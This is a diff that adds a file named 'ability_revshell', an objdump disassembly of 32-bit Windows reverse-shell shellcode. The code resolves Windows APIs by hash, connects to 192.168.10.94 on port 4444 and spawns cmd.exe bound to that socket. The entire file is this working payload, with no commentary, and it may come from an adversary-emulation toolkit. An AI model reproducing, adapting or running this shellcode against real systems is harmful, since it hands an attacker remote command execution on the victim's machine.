@@ -1,0 +1,150 @@
+
+ability_revshell:     file format binary
+
+
+Disassembly of section .data:
+
+00000000 <.data>:
+   0:	fc                   	cld    
+   1:	e8 89 00 00 00       	call   0x8f
+   6:	60                   	pusha  
+   7:	89 e5                	mov    ebp,esp
+   9:	31 d2                	xor    edx,edx
+   b:	64 8b 52 30          	mov    edx,DWORD PTR fs:[edx+0x30]
+   f:	8b 52 0c             	mov    edx,DWORD PTR [edx+0xc]
+  12:	8b 52 14             	mov    edx,DWORD PTR [edx+0x14]
+  15:	8b 72 28             	mov    esi,DWORD PTR [edx+0x28]
+  18:	0f b7 4a 26          	movzx  ecx,WORD PTR [edx+0x26]
+  1c:	31 ff                	xor    edi,edi
+  1e:	31 c0                	xor    eax,eax
+  20:	ac                   	lods   al,BYTE PTR ds:[esi]
+  21:	3c 61                	cmp    al,0x61
+  23:	7c 02                	jl     0x27
+  25:	2c 20                	sub    al,0x20
+  27:	c1 cf 0d             	ror    edi,0xd
+  2a:	01 c7                	add    edi,eax
+  2c:	e2 f0                	loop   0x1e
+  2e:	52                   	push   edx
+  2f:	57                   	push   edi
+  30:	8b 52 10             	mov    edx,DWORD PTR [edx+0x10]
+  33:	8b 42 3c             	mov    eax,DWORD PTR [edx+0x3c]
+  36:	01 d0                	add    eax,edx
+  38:	8b 40 78             	mov    eax,DWORD PTR [eax+0x78]
+  3b:	85 c0                	test   eax,eax
+  3d:	74 4a                	je     0x89
+  3f:	01 d0                	add    eax,edx
+  41:	50                   	push   eax
+  42:	8b 48 18             	mov    ecx,DWORD PTR [eax+0x18]
+  45:	8b 58 20             	mov    ebx,DWORD PTR [eax+0x20]
+  48:	01 d3                	add    ebx,edx
+  4a:	e3 3c                	jecxz  0x88
+  4c:	49                   	dec    ecx
+  4d:	8b 34 8b             	mov    esi,DWORD PTR [ebx+ecx*4]
+  50:	01 d6                	add    esi,edx
+  52:	31 ff                	xor    edi,edi
+  54:	31 c0                	xor    eax,eax
+  56:	ac                   	lods   al,BYTE PTR ds:[esi]
+  57:	c1 cf 0d             	ror    edi,0xd
+  5a:	01 c7                	add    edi,eax
+  5c:	38 e0                	cmp    al,ah
+  5e:	75 f4                	jne    0x54
+  60:	03 7d f8             	add    edi,DWORD PTR [ebp-0x8]
+  63:	3b 7d 24             	cmp    edi,DWORD PTR [ebp+0x24]
+  66:	75 e2                	jne    0x4a
+  68:	58                   	pop    eax
+  69:	8b 58 24             	mov    ebx,DWORD PTR [eax+0x24]
+  6c:	01 d3                	add    ebx,edx
+  6e:	66 8b 0c 4b          	mov    cx,WORD PTR [ebx+ecx*2]
+  72:	8b 58 1c             	mov    ebx,DWORD PTR [eax+0x1c]
+  75:	01 d3                	add    ebx,edx
+  77:	8b 04 8b             	mov    eax,DWORD PTR [ebx+ecx*4]
+  7a:	01 d0                	add    eax,edx
+  7c:	89 44 24 24          	mov    DWORD PTR [esp+0x24],eax
+  80:	5b                   	pop    ebx
+  81:	5b                   	pop    ebx
+  82:	61                   	popa   
+  83:	59                   	pop    ecx
+  84:	5a                   	pop    edx
+  85:	51                   	push   ecx
+  86:	ff e0                	jmp    eax
+  88:	58                   	pop    eax
+  89:	5f                   	pop    edi
+  8a:	5a                   	pop    edx
+  8b:	8b 12                	mov    edx,DWORD PTR [edx]
+  8d:	eb 86                	jmp    0x15
+  8f:	5d                   	pop    ebp
+  90:	68 33 32 00 00       	push   0x3233
+  95:	68 77 73 32 5f       	push   0x5f327377
+  9a:	54                   	push   esp
+  9b:	68 4c 77 26 07       	push   0x726774c
+  a0:	ff d5                	call   ebp
+  a2:	b8 90 01 00 00       	mov    eax,0x190
+  a7:	29 c4                	sub    esp,eax
+  a9:	54                   	push   esp
+  aa:	50                   	push   eax
+  ab:	68 29 80 6b 00       	push   0x6b8029
+  b0:	ff d5                	call   ebp
+  b2:	50                   	push   eax
+  b3:	50                   	push   eax
+  b4:	50                   	push   eax
+  b5:	50                   	push   eax
+  b6:	40                   	inc    eax
+  b7:	50                   	push   eax
+  b8:	40                   	inc    eax
+  b9:	50                   	push   eax
+  ba:	68 ea 0f df e0       	push   0xe0df0fea
+  bf:	ff d5                	call   ebp
+  c1:	89 c7                	mov    edi,eax
+  c3:	68 c0 a8 0a 5e       	push   0x5e0aa8c0
+  c8:	68 02 00 11 5c       	push   0x5c110002
+  cd:	89 e6                	mov    esi,esp
+  cf:	6a 10                	push   0x10
+  d1:	56                   	push   esi
+  d2:	57                   	push   edi
+  d3:	68 99 a5 74 61       	push   0x6174a599
+  d8:	ff d5                	call   ebp
+  da:	68 63 6d 64 00       	push   0x646d63
+  df:	89 e3                	mov    ebx,esp
+  e1:	57                   	push   edi
+  e2:	57                   	push   edi
+  e3:	57                   	push   edi
+  e4:	31 f6                	xor    esi,esi
+  e6:	6a 12                	push   0x12
+  e8:	59                   	pop    ecx
+  e9:	56                   	push   esi
+  ea:	e2 fd                	loop   0xe9
+  ec:	66 c7 44 24 3c 01 01 	mov    WORD PTR [esp+0x3c],0x101
+  f3:	8d 44 24 10          	lea    eax,[esp+0x10]
+  f7:	c6 00 44             	mov    BYTE PTR [eax],0x44
+  fa:	54                   	push   esp
+  fb:	50                   	push   eax
+  fc:	56                   	push   esi
+  fd:	56                   	push   esi
+  fe:	56                   	push   esi
+  ff:	46                   	inc    esi
+ 100:	56                   	push   esi
+ 101:	4e                   	dec    esi
+ 102:	56                   	push   esi
+ 103:	56                   	push   esi
+ 104:	53                   	push   ebx
+ 105:	56                   	push   esi
+ 106:	68 79 cc 3f 86       	push   0x863fcc79
+ 10b:	ff d5                	call   ebp
+ 10d:	89 e0                	mov    eax,esp
+ 10f:	4e                   	dec    esi
+ 110:	56                   	push   esi
+ 111:	46                   	inc    esi
+ 112:	ff 30                	push   DWORD PTR [eax]
+ 114:	68 08 87 1d 60       	push   0x601d8708
+ 119:	ff d5                	call   ebp
+ 11b:	bb e0 1d 2a 0a       	mov    ebx,0xa2a1de0
+ 120:	68 a6 95 bd 9d       	push   0x9dbd95a6
+ 125:	ff d5                	call   ebp
+ 127:	3c 06                	cmp    al,0x6
+ 129:	7c 0a                	jl     0x135
+ 12b:	80 fb e0             	cmp    bl,0xe0
+ 12e:	75 05                	jne    0x135
+ 130:	bb 47 13 72 6f       	mov    ebx,0x6f721347
+ 135:	6a 00                	push   0x0
+ 137:	53                   	push   ebx
+ 138:	ff d5                	call   ebp
